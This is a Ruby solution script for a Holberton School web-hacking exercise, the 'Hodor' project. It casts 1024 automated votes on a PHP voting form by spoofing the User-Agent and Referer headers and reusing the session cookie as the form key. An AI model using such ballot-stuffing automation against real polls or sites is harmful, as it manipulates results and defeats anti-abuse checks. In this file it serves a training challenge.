#!/usr/bin/env ruby

=begin <= Ruby multiline comment
===---Description---------------------------------------------------------------===
# Solution for the Hodor Project, Level 1 by Julien Barbier.
# Using Ruby Language.
# by Alexandro de Oliveira, for Holberton School
===-----------------------------------------------------------------------------===
=end

require 'uri'
require 'net/http'

url = "http://173.246.108.142/level2.php"
# Parsing the URL:
uri = URI.parse(url)
# Setting the http request:
http = Net::HTTP.new(uri.host, uri.port)
# Setting the http request headers:
headers = {
  'User-Agent' => 'Windows NT 100 (aka: Blue Screen of Death!) havk64 - Ruby Requests',
  'Content-Type' => 'application/x-www-form-urlencoded',
  'Referer' => url,
}
head = http.head(uri.path, headers)
cookie = head['Set-cookie'].split('; ')[0]
headers['Cookie'] = cookie
# Setting POST request parameters:
params = URI.encode_www_form({
                               'id' => "1",
                               'holdthedoor' => "submit",
                               'key' => cookie.split('=')[1],
                             })
# Processing the POST requests:
votes = 0 # A vote counter
total_votes = (1 << 10)
loop do  # The result of this bitwise operatation(1 << 10) is "1024"
    resp, _ = http.post(uri.path, params, headers)
    unless resp['Set-Cookie'].nil?
        puts "Vote number: #{votes += 1}"
        break if votes == total_votes
        # Optionally printing the response object hash:
        #puts "Headers: #{resp.to_hash.inspect}"
    else
        puts "Failed! (Vote not computed)"
    end
end

puts "Total of valid votes is: #{votes}"
